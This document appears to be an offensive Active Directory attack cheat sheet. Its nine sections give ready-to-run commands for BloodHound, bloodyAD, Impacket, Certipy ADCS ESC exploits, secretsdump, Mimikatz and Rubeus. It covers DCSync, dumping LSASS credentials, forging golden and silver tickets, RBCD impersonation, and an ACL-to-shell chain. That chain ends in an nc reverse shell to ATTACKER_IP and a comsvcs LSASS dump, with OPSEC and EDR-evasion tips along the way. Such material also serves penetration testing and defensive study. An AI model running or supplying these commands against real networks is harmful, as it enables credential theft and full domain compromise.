01BloodHound Collection (bloodhound.py)▶ 
# Standard — collect everything
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All

# Specific collection methods (faster / less noise)
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c DCOnly              # DC objects only — fast, low noise
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c Session,Trusts      # sessions + trust relationships

# NTLM hash instead of password
python3 bloodhound.py -d DOMAIN.LOCAL -u username \
  --hashes :NTLMHASH -ns <DC_IP> -c All

# Kerberos ticket (CCACHE) — no password on the wire
export KRB5CCNAME=/path/to/ticket.ccache
python3 bloodhound.py -d DOMAIN.LOCAL -u username -k --no-pass \
  -ns <DC_IP> -c All

# Specify DC hostname explicitly
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  --dc DC01.DOMAIN.LOCAL -ns <DC_IP> -c All

# Custom output directory + auto-zip for BloodHound import
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All -o ./bh_out/ --zip
Load the resulting JSON/zip files into the BloodHound GUI: Database → Upload Data. Use the "Shortest Paths to Domain Admins" pre-built query as a starting point.
02BloodHound — Common Errors & Fixes▶ 
# ── Error: DNS resolution failure ────────────────────────────────────────────
# Symptom: "Could not find domain controller", "NXDOMAIN", "Name or service not known"
# Fix: always pass -ns pointing at the DC
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All

# Or add the DC to /etc/resolv.conf temporarily
echo "nameserver <DC_IP>" | sudo tee -a /etc/resolv.conf

# ── Error: Clock skew / KRB_AP_ERR_SKEW ──────────────────────────────────────
# Symptom: Kerberos auth fails with clock skew error
sudo ntpdate <DC_IP>           # sync clock to DC
sudo timedatectl set-ntp false
sudo date -s "$(net time -S <DC_IP>)"   # or use net time

# ── Error: LDAP query failed / connection reset ───────────────────────────────
# Symptom: collection hangs or returns 0 objects
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All --auth-method ntlm    # force NTLM (default may try Kerberos)

python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All --dns-tcp             # use TCP for DNS (firewalled UDP)

# ── Error: "Connection refused" on port 389 ───────────────────────────────────
# LDAP may be blocked — try LDAPS (636)
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All -p 636 --secure       # TLS / LDAPS

# ── Error: STATUS_LOGON_FAILURE / bad credentials ────────────────────────────
# Verify creds first:
crackmapexec smb <DC_IP> -u username -p 'Password123'
# Check for account lockout policy before brute-forcing

# ── Error: empty or partial JSON output ──────────────────────────────────────
# Symptom: files created but few/no objects collected
python3 bloodhound.py -d DOMAIN.LOCAL -u username -p 'Password123' \
  -ns <DC_IP> -c All --disable-pooling -w 1   # single-threaded, no pool
03bloodyAD.py — ACL Object Manipulation▶

All commands assume -d DOMAIN.LOCAL -u USER -p 'PASS' --host DC_IP. Swap -p 'PASS' for --hashes :NTLMHASH or -k (Kerberos with KRB5CCNAME set).

# ─────────────────────────────────────────────────────────────────────────────
# SYNTAX:  python3 bloodyAD.py -d DOMAIN.LOCAL -u USER -p 'PASS' --host DC_IP
# Also accepts: --hashes LMHASH:NTLMHASH   or   -k (Kerberos w/ KRB5CCNAME)
# ─────────────────────────────────────────────────────────────────────────────

# ── GET — read object attributes ──────────────────────────────────────────────
python3 bloodyAD.py [...] get object TARGET_USER \
  --attr memberOf,servicePrincipalName,msDS-AllowedToActOnBehalfOfOtherIdentity

python3 bloodyAD.py [...] get object "Domain Admins" --attr member

# ── SET PASSWORD (GenericAll / ForceChangePassword) ───────────────────────────
python3 bloodyAD.py [...] set password TARGET_USER 'NewPassword123!'

# ── SET SPN — targeted Kerberoasting (GenericWrite / GenericAll on user) ──────
python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName \
  -v 'MSSQLSvc/fake.domain.local:1433'

# Remove the SPN after attack (cleanup)
python3 bloodyAD.py [...] set object TARGET_USER servicePrincipalName -v ''

# ── SHADOW CREDENTIALS — add KeyCredential (GenericWrite / GenericAll) ────────
python3 bloodyAD.py [...] set shadowCredentials TARGET_USER
# Then authenticate:  certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP

# ── ADD / REMOVE GROUP MEMBER (GenericAll / Self / AddMember on group) ────────
python3 bloodyAD.py [...] add groupMember "Domain Admins" TARGET_USER
python3 bloodyAD.py [...] remove groupMember "Domain Admins" TARGET_USER

# ── GRANT DCSync (WriteDACL on domain) ────────────────────────────────────────
python3 bloodyAD.py [...] add dcsync TARGET_USER

# ── RBCD — Resource-Based Constrained Delegation (GenericWrite on computer) ───
# Grant ATTACKER_MACHINE$ the right to impersonate users on TARGET_MACHINE$
python3 bloodyAD.py [...] set rbcd TARGET_MACHINE$ ATTACKER_MACHINE$

# Clear RBCD after attack
python3 bloodyAD.py [...] remove rbcd TARGET_MACHINE$ ATTACKER_MACHINE$

# ── UAC FLAGS (GenericAll) ─────────────────────────────────────────────────────
python3 bloodyAD.py [...] set uac TARGET_USER -f ACCOUNTDISABLE      # disable
python3 bloodyAD.py [...] set uac TARGET_USER -f DONT_REQ_PREAUTH    # ASREPRoastable

# ── LOGON SCRIPT (GenericWrite — code exec on next logon) ─────────────────────
python3 bloodyAD.py [...] set object TARGET_USER scriptPath \
  -v '\\ATTACKER_IP\share\payload.bat'

# ── RESTORE DELETED OBJECT ────────────────────────────────────────────────────
# First find deleted objects (requires Recycle Bin feature enabled)
python3 bloodyAD.py [...] get object \
  "CN=DeletedUser,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL" --attr *

python3 bloodyAD.py [...] restore object \
  "CN=DeletedUser\0ADEL:guid,CN=Deleted Objects,DC=DOMAIN,DC=LOCAL"

# ── COMPUTER OBJECT — create machine account (MachineAccountQuota > 0) ────────
python3 bloodyAD.py [...] add computer ATTACKER_MACHINE$ 'MachinePass123!'

# ── GENERIC ATTRIBUTE WRITE ───────────────────────────────────────────────────
python3 bloodyAD.py [...] set object TARGET_USER altSecurityIdentities \
  -v 'Kerberos:cn=attacker,cn=users,dc=domain,dc=local'
04Kerberos Ticket Operations▶ 
# ── getTGT.py ─────────────────────────────────────────────────────────────────
# Password
python3 getTGT.py DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP

# NTLM hash (Pass-the-Hash → TGT)
python3 getTGT.py DOMAIN.LOCAL/username -hashes :NTLMHASH -dc-ip DC_IP

# AES key (Pass-the-Key — more OPSEC)
python3 getTGT.py DOMAIN.LOCAL/username -aesKey AES256KEY -dc-ip DC_IP

# Output file name
python3 getTGT.py DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP \
  -o custom_name.ccache

# ── getST.py — Service Ticket (TGS) ──────────────────────────────────────────
# Request a TGS for a specific SPN
python3 getST.py DOMAIN.LOCAL/username:'Password123' \
  -spn MSSQLSvc/server.domain.local -dc-ip DC_IP

# S4U2Self + S4U2Proxy — impersonate Administrator via RBCD / constrained deleg
python3 getST.py DOMAIN.LOCAL/machine$:'MachinePass123!' \
  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP

# With hash
python3 getST.py DOMAIN.LOCAL/machine$ -hashes :MACHINEPASSHASH \
  -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP

# ── KRB5CCNAME — exporting and using tickets ──────────────────────────────────
# Export ticket for all impacket / bloodyAD tools
export KRB5CCNAME=/path/to/username.ccache

# Use with impacket
python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 smbexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL

# Use with crackmapexec
export KRB5CCNAME=admin.ccache
crackmapexec smb TARGET_IP --kerberos -u Administrator -d DOMAIN.LOCAL

# List current tickets
klist

# Destroy all tickets
kdestroy

# ── ticketConverter.py — CCACHE ↔ Kirbi ──────────────────────────────────────
python3 ticketConverter.py ticket.ccache ticket.kirbi   # → Kirbi for Rubeus
python3 ticketConverter.py ticket.kirbi  ticket.ccache  # → CCACHE for Linux
After exporting KRB5CCNAME, every Impacket tool with -k -no-pass will use the ticket automatically. No password goes on the wire.
05Certipy — ADCS Attacks▶

Always start with certipy find -vulnerable to identify the ESC class before running the matching exploit chain.

# ── Enumerate ADCS — find CA and templates ────────────────────────────────────
certipy find -u username@DOMAIN.LOCAL -p 'Password123' -dc-ip DC_IP

# Show only vulnerable templates to stdout (no output files)
certipy find -u username@DOMAIN.LOCAL -p 'Password123' \
  -dc-ip DC_IP -vulnerable -stdout

# With hash
certipy find -u username@DOMAIN.LOCAL -hashes :NTLMHASH -dc-ip DC_IP -vulnerable

# ── ESC1 — Enrollee Supplies Subject + allow SAN ─────────────────────────────
# Request cert as Administrator (arbitrary SAN)
certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'VulnerableTemplate' \
  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP

# ── ESC2 — Any Purpose EKU or No EKU ─────────────────────────────────────────
certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'VulnerableTemplate' -dc-ip DC_IP

# ── ESC3 — Certificate Request Agent (enroll on behalf of) ───────────────────
# Step 1: obtain enrollment agent cert
certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'EnrollmentAgent' -dc-ip DC_IP

# Step 2: request cert on behalf of Administrator
certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'User' \
  -on-behalf-of 'DOMAIN\Administrator' -pfx enrollment_agent.pfx -dc-ip DC_IP

# ── ESC4 — Vulnerable Template ACLs (WriteDacl/WriteOwner on template) ────────
# Save old template config and overwrite to ESC1
certipy template -u username@DOMAIN.LOCAL -p 'Password123' \
  -template 'VulnerableTemplate' -save-old -dc-ip DC_IP

# Then exploit as ESC1, then restore
certipy template -u username@DOMAIN.LOCAL -p 'Password123' \
  -template 'VulnerableTemplate' -configuration old.json -dc-ip DC_IP

# ── ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA ─────────────────────────
# Same as ESC1 — CA allows SAN on any template
certipy req -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -template 'User' \
  -upn administrator@DOMAIN.LOCAL -dc-ip DC_IP

# ── ESC7 — Manage CA / Manage Certificates right ─────────────────────────────
certipy ca -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -add-officer username -dc-ip DC_IP
certipy ca -u username@DOMAIN.LOCAL -p 'Password123' \
  -ca 'CA-NAME' -enable-template 'SubCA' -dc-ip DC_IP

# ── ESC8 — NTLM relay to AD CS HTTP endpoint ─────────────────────────────────
certipy relay -target http://CA_IP/certsrv/certfnsh.asp -template DomainController

# ── Authenticate with certificate (PKINIT → get hash + TGT) ─────────────────
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → dumps administrator hash + saves .ccache ticket

# ── Shadow Credentials via ADCS (auto — requires GenericWrite on target) ──────
certipy shadow auto -u username@DOMAIN.LOCAL -p 'Password123' \
  -account TARGET_USER -dc-ip DC_IP
certipy auth against a vulnerable CA yields both the NTLM hash and a .ccache TGT in one step — no password needed after that point.
06secretsdump.py▶ 
# ── Remote DCSync — dump all domain hashes ───────────────────────────────────
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP

# With NTLM hash
python3 secretsdump.py DOMAIN.LOCAL/username@DC_IP \
  -hashes LMHASH:NTLMHASH

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
python3 secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@DC01.DOMAIN.LOCAL

# Dump only a specific account
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP \
  -just-dc-user Administrator

# NTLM hashes only (skip LSA secrets, faster)
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP \
  -just-dc-ntlm

# ── Remote SAM dump — non-DC machine ─────────────────────────────────────────
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@MACHINE_IP

# ── Offline — from registry hive files (reg save) ────────────────────────────
# First on target: reg save HKLM\SAM SAM && reg save HKLM\SYSTEM SYSTEM
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# ── Offline — from NTDS.dit (grabbed via VSS / Backup Operators) ─────────────
python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# ── Output to file ────────────────────────────────────────────────────────────
python3 secretsdump.py DOMAIN.LOCAL/username:'Password123'@DC_IP \
  -outputfile domain_hashes
07Mimikatz▶

Run from an elevated prompt. privilege::debug is required before most commands. Use .\mimikatz.exe in PowerShell (bare name invokes Set-Alias).

# ── Elevation and basic setup ────────────────────────────────────────────────
privilege::debug                        # enable SeDebugPrivilege (required for most)
token::elevate                          # impersonate SYSTEM token

# ── Credential Dumping ────────────────────────────────────────────────────────
sekurlsa::logonpasswords                # dump all logged-on creds from LSASS
sekurlsa::wdigest                       # dump WDigest (plaintext on older OS)
sekurlsa::kerberos                      # dump Kerberos tickets from LSASS
sekurlsa::dpapi                         # dump DPAPI master keys from memory

# Dump from LSASS minidump (offline / EDR bypass)
sekurlsa::minidump C:\lsass.dmp         # point at dump file (ABSOLUTE path)
sekurlsa::logonpasswords                # parse the dump

# Local SAM and LSA secrets
lsadump::sam                            # local SAM hashes
lsadump::secrets                        # LSA secrets (service account plaintexts)
lsadump::cache                          # cached domain credentials (DCC2 hashes)

# ── DCSync — pull any account's hash from a DC ───────────────────────────────
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv   # dump everything to CSV

# ── Pass the Hash ─────────────────────────────────────────────────────────────
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
  /ntlm:NTLMHASH /run:cmd.exe           # spawn cmd.exe as that user

# Overpass the Hash (Pass-the-Key — AES for better OPSEC)
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL \
  /aes256:AES256KEY /run:powershell.exe

# ── Kerberos Ticket Manipulation ──────────────────────────────────────────────
kerberos::list                          # list all tickets in memory
kerberos::list /export                  # export tickets to .kirbi files
kerberos::purge                         # purge all tickets
kerberos::ptt ticket.kirbi              # pass-the-ticket (import .kirbi)

# Golden Ticket — forge TGT with krbtgt hash (persistence)
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_NTLMHASH /id:500

# Silver Ticket — forge TGS for specific service
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:DC01.DOMAIN.LOCAL /service:cifs \
  /rc4:MACHINE_NTLMHASH /id:500
08Rubeus.exe▶

All Rubeus operations are in-process (.NET) — no LSASS handle is opened for most tasks, making it more OPSEC-friendly than Mimikatz for ticket work.

# ── Kerberoasting ────────────────────────────────────────────────────────────
Rubeus.exe kerberoast /outfile:hashes.txt                   # all SPNs
Rubeus.exe kerberoast /user:svc_sql /outfile:sql.txt        # specific user
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt         # RC4 downgrade avoidance
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt         # request RC4 explicitly

# ── AS-REP Roasting ──────────────────────────────────────────────────────────
Rubeus.exe asreproast /outfile:asrep.txt                    # all DONT_REQ_PREAUTH
Rubeus.exe asreproast /user:target /outfile:asrep.txt       # specific user
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt    # hashcat format

# ── Request TGT ───────────────────────────────────────────────────────────────
Rubeus.exe asktgt /user:username /password:Password123 \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap

# With NTLM hash (Overpass-the-Hash)
Rubeus.exe asktgt /user:username /rc4:NTLMHASH \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap

# With AES key (better OPSEC)
Rubeus.exe asktgt /user:username /aes256:AES256KEY \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /opsec

# ── Pass-the-Ticket ───────────────────────────────────────────────────────────
Rubeus.exe ptt /ticket:BASE64TICKETBLOB==          # import from base64
Rubeus.exe ptt /ticket:C:\ticket.kirbi             # import from file
Rubeus.exe triage                                  # list all tickets in all sessions
Rubeus.exe dump                                    # dump all tickets
Rubeus.exe dump /user:Administrator /service:krbtgt /nowrap   # specific ticket
Rubeus.exe purge                                   # delete all tickets

# ── S4U — constrained delegation / RBCD ──────────────────────────────────────
# Full S4U chain: impersonate Administrator → CIFS on target
Rubeus.exe s4u /user:machine$ /rc4:MACHINEPASSHASH \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.DOMAIN.LOCAL \
  /domain:DOMAIN.LOCAL /dc:DC_IP /nowrap /ptt

# With existing TGT
Rubeus.exe s4u /ticket:machine_tgt.kirbi \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.DOMAIN.LOCAL /ptt

# ── Golden / Silver Tickets ───────────────────────────────────────────────────
Rubeus.exe golden /user:Administrator /id:500 \
  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_HASH /nowrap /ptt

Rubeus.exe silver /user:Administrator /id:500 \
  /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /service:cifs /rc4:MACHINE_HASH \
  /target:TARGET.DOMAIN.LOCAL /nowrap /ptt

# ── Monitoring (unconstrained delegation / credential capture) ────────────────
Rubeus.exe monitor /interval:5 /nowrap             # watch for new TGTs
Rubeus.exe monitor /targetuser:DC01$ /interval:5  # watch for specific user
Rubeus.exe harvest /interval:30                    # auto-renew harvested TGTs
/nowrap prints the base64 ticket as one line — pipe directly into Rubeus.exe ptt /ticket:<base64> or save for later use.
09ACL-Based Shell Access▶

Starting from AD object permissions over a computer (or user) — full chain to interactive shell.

# ─── You have ACL rights over a computer object → pivot to shell ──────────────

# ── RBCD flow (GenericWrite / GenericAll on target computer) ─────────────────
# 1. Create or use existing machine account
python3 addcomputer.py -computer-name 'ATTACKER$' \
  -computer-pass 'P@ssword123' DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP

# 2. Set RBCD — allow ATTACKER$ to impersonate users on TARGET
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' \
  -action write DOMAIN.LOCAL/username:'Password123' -dc-ip DC_IP

# 3. Get TGT for the attacker machine account
python3 getTGT.py DOMAIN.LOCAL/'ATTACKER$':'P@ssword123' -dc-ip DC_IP
export KRB5CCNAME=ATTACKER$.ccache

# 4. S4U2Self + S4U2Proxy — impersonate Administrator on TARGET
python3 getST.py DOMAIN.LOCAL/'ATTACKER$':'P@ssword123' \
  -spn cifs/TARGET.DOMAIN.LOCAL \
  -impersonate Administrator -dc-ip DC_IP
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache

# 5. Shell
python3 psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL
python3 wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@TARGET.DOMAIN.LOCAL

# ── Shadow Credentials flow (GenericWrite / GenericAll on target) ─────────────
# 1. Write KeyCredential to target
python3 pywhisker.py -d DOMAIN.LOCAL -u attacker -p 'Password123' \
  --target TARGET_USER --action add --dc-ip DC_IP
# 2. Authenticate with the pfx
certipy auth -pfx TARGET_USER.pfx -dc-ip DC_IP
# → outputs NTLM hash + CCACHE
export KRB5CCNAME=TARGET_USER.ccache

# ── WriteDACL on target computer → grant yourself GenericAll ──────────────────
python3 dacledit.py -action write -rights FullControl \
  -principal attacker -target 'TARGET$' \
  DOMAIN.LOCAL/attacker:'Password123' -dc-ip DC_IP

# ── Once you have a shell: check token privileges ────────────────────────────
whoami /all
whoami /priv
# Look for: SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege

# ── SeImpersonate on the box → SYSTEM via Potato ────────────────────────────
# Upload GodPotato, PrintSpoofer, or SigmaPotato
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators attacker /add"
PrintSpoofer.exe -c "nc.exe <ATTACKER_IP> 4444 -e cmd"

# ── After SYSTEM: credential dump ────────────────────────────────────────────
# Dump SAM (reg save while SYSTEM/admin)
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Or run mimikatz directly:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# LSASS dump via comsvcs (no upload needed)
for /f "tokens=1,2" %a in ('tasklist /fi "imagename eq lsass.exe" /fo list ^| findstr "PID:"') do set lsasspid=%b
rundll32 C:\Windows\System32\comsvcs.dll MiniDump %lsasspid% C:\Windows\Temp\lsass.dmp full
